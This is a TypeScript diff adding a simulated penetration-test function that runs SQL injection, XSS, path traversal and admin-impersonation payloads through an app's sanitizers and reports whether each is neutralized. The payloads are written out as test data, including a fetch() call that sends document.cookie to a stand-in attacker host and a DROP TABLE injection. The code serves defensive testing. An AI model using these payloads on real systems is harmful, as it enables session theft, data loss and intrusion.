@@ -304,3 +304,113 @@ function simpleHash(str: string): string {
   return String(hash);
 }
 
+/**
+ * Automated Security Penetration Test Suite (Simulated Attacker Audit)
+ * Runs a battery of hacker payloads across all defensive boundaries
+ * to verify complete neutralization and zero privilege escalation.
+ */
+export function runSecurityPenetrationTest(): {
+  totalTests: number;
+  passed: number;
+  failed: number;
+  results: Array<{ testName: string; payload: string; neutralized: boolean; details: string }>;
+  overallStatus: 'SECURE' | 'VULNERABLE';
+} {
+  const results: Array<{ testName: string; payload: string; neutralized: boolean; details: string }> = [];
+
+  // Test 1: SQL Injection in Post/Comment/Bio
+  const sqlPayloads = [
+    "' OR '1'='1' --",
+    "1; DROP TABLE messages; --",
+    "' UNION SELECT id, username, password FROM users --",
+    "admin' --"
+  ];
+  for (const payload of sqlPayloads) {
+    const audit = auditSecurityPayload(payload);
+    const sanitized = sanitizeText(payload);
+    const isNeutralized = !audit.isClean && audit.threatLevel !== 'SAFE';
+    results.push({
+      testName: 'SQL Injection Defense',
+      payload,
+      neutralized: isNeutralized,
+      details: `Threat detected: ${audit.detectedPatterns.join(', ')} | Cleaned: ${sanitized.slice(0, 30)}`
+    });
+  }
+
+  // Test 2: Stored & DOM Cross-Site Scripting (XSS)
+  const xssPayloads = [
+    '<script>alert(document.cookie)</script>',
+    '<img src=x onerror="fetch(\'https://attacker.site/steal?c=\'+document.cookie)">',
+    'javascript:alert("XSS")',
+    '<svg/onload=alert(1)>',
+    '<iframe src="https://phishing.site"></iframe>'
+  ];
+  for (const payload of xssPayloads) {
+    const sanitized = sanitizeText(payload);
+    const sanitizedUrl = sanitizeUrl(payload);
+    const audit = auditSecurityPayload(payload);
+    const noRawScript = !sanitized.includes('<script>') && !sanitized.includes('onerror=') && !sanitized.includes('javascript:');
+    const urlNeutralized = sanitizedUrl === '#' || !sanitizedUrl.startsWith('javascript:');
+    const neutralized = noRawScript && urlNeutralized;
+    results.push({
+      testName: 'XSS Vector Neutralization',
+      payload,
+      neutralized,
+      details: `Raw tags stripped: ${noRawScript} | URL sanitized to: "${sanitizedUrl}"`
+    });
+  }
+
+  // Test 3: Path Traversal & Directory Climbing
+  const pathPayloads = [
+    '../../../../etc/passwd',
+    '..\\..\\windows\\system32\\cmd.exe',
+    '%2e%2e%2fconfig.json'
+  ];
+  for (const payload of pathPayloads) {
+    const sanitizedFile = sanitizeFileName(payload);
+    const audit = auditSecurityPayload(payload);
+    const neutralized = !sanitizedFile.includes('..') && !sanitizedFile.includes('/');
+    results.push({
+      testName: 'Path Traversal Prevention',
+      payload,
+      neutralized,
+      details: `Sanitized filename: "${sanitizedFile}"`
+    });
+  }
+
+  // Test 4: Privilege Escalation & Reserved Username Impersonation
+  const reservedTargets = ['nylithra', 'admin', 'administrator', 'system', 'root', 'support'];
+  for (const username of reservedTargets) {
+    const val = validateUsername(username);
+    const isBlocked = !val.isValid && isReservedUsername(username);
+    results.push({
+      testName: 'Privilege & Identity Impersonation Protection',
+      payload: `@${username}`,
+      neutralized: isBlocked,
+      details: isBlocked ? 'Reserved username registration strictly rejected' : 'FAILED: Allowed registration'
+    });
+  }
+
+  // Test 5: Privilege Verification (Falsified Role Attack)
+  const fakeAdminUser = { id: 'attacker_1', username: 'hacker', role: 'member' };
+  const isAdminBlocked = !verifyAdminAccess(fakeAdminUser);
+  results.push({
+    testName: 'Unauthorized Admin Access Escalation',
+    payload: JSON.stringify(fakeAdminUser),
+    neutralized: isAdminBlocked,
+    details: isAdminBlocked ? 'Unauthorized user denied administrative access' : 'FAILED: Admin bypass'
+  });
+
+  const totalTests = results.length;
+  const passed = results.filter((r) => r.neutralized).length;
+  const failed = totalTests - passed;
+
+  return {
+    totalTests,
+    passed,
+    failed,
+    results,
+    overallStatus: failed === 0 ? 'SECURE' : 'VULNERABLE'
+  };
+}
+
